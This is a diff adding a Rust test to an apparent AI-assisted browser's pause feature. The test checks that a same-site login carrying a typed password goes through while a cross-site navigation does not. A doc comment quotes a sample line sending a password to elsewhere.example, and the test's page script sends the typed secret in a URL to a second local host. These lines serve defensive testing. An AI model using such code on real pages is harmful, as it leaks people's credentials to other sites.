@@ -1223,6 +1223,88 @@ async fn while_paused_the_persons_navigation_goes_and_the_pages_own_writes_do_no
     );
 }
 
+/// **A pause is not a page's licence to leave with what the person typed.**
+///
+/// The person pressing a button and a page running
+/// `location.href = "https://elsewhere.example/?p=" + password` are the same
+/// request on the wire, and only one of them is the person. So while paused a
+/// main-frame navigation that carries a typed secret goes through **only if it
+/// stays on the site the frame already shows** — which is the login, the reset
+/// and the redirect that follow them, the things a pause exists to let happen.
+/// A secret going to another site is exactly what pausing is for.
+///
+/// Both halves are proved here: the same-site navigation goes, and the cross-site
+/// one does not, with the same page, the same pause and the same typed value.
+#[tokio::test]
+async fn while_paused_a_login_to_the_person_s_own_site_goes_and_the_same_navigation_to_another_site_does_not() {
+    // **Two sites, one server.** The fixture is bound to every local address, so
+    // the same process answers on `127.0.0.1` and on `127.0.0.2` — both this
+    // computer's own network, both reachable, two different host names and so two
+    // different sites. The only thing that differs between the two navigations
+    // below is the site they go to.
+    let (bound, arrived) =
+        common::serve_on("0.0.0.0", &[common::page(SHOP), common::page_at("/login", "<h1>you are signed in</h1>")]).await;
+    let base = bound.replace("0.0.0.0", "127.0.0.1");
+    let other = bound.replace("0.0.0.0", "127.0.0.2");
+    let (sessions, page, holds) =
+        common::confirming_window_for("confirm-paused-cross-site", &base, Some(&other)).await;
+
+    sessions.set_paused(true);
+    assert!(sessions.paused(), "the window is paused");
+    page.goto(&base, None).await.expect("the shop loads");
+    holds.typed_in(1, "hunter2-the-passphrase").await;
+
+    // **The person's own login, on the site they are already on.** It is a
+    // navigation carrying what they typed, and it is theirs: a pause that held it
+    // would freeze the one thing they opened the browser to do.
+    page.evaluate::<String, ()>(
+        // Fired, not awaited: a held request never answers.
+        r#"payload => {
+            const [base, secret] = JSON.parse(payload);
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = base + '/login';
+            form.innerHTML = '<input name="password" value="' + secret + '">';
+            document.body.appendChild(form);
+            form.requestSubmit();
+        }"#,
+        Some(&format!(r#"["{base}","hunter2-the-passphrase"]"#)),
+    )
+    .await
+    .ok();
+    assert!(poll_for_body(&arrived, "/login", 20).await.is_some(), "their own login went out: {:?}", arrived.requests());
+
+    // **The same navigation to another site**, with the same value, from a page
+    // script. Nothing about the request has changed except where it goes.
+    page.goto(&base, None).await.expect("back to the shop");
+    holds.typed_in(1, "hunter2-the-passphrase").await;
+    page.evaluate::<String, ()>(
+        r#"payload => {
+            const [other, secret] = JSON.parse(payload);
+            location.href = other + '/take?p=' + encodeURIComponent(secret);
+        }"#,
+        Some(&format!(r#"["{other}","hunter2-the-passphrase"]"#)),
+    )
+    .await
+    .ok();
+    tokio::time::sleep(Duration::from_millis(800)).await;
+
+    assert!(
+        !arrived.asked_for("/take?"),
+        "and it did not go out on this one either: {:?}",
+        arrived.requests()
+    );
+    assert_eq!(holds.waiting().await, 1, "it is held as a card, which is what a write is");
+
+    // And the person is still on the page they were on: a held navigation does
+    // not freeze the window, it leaves it exactly where the person put it.
+    assert!(
+        page.url().starts_with(&base),
+        "the person was moved by a request that was held: {}",
+        page.url()
+    );
+}
+
 /// **One chat is never told what happened in another.**
 ///
 /// The outcome is how a model learns a person decided something, and it is said
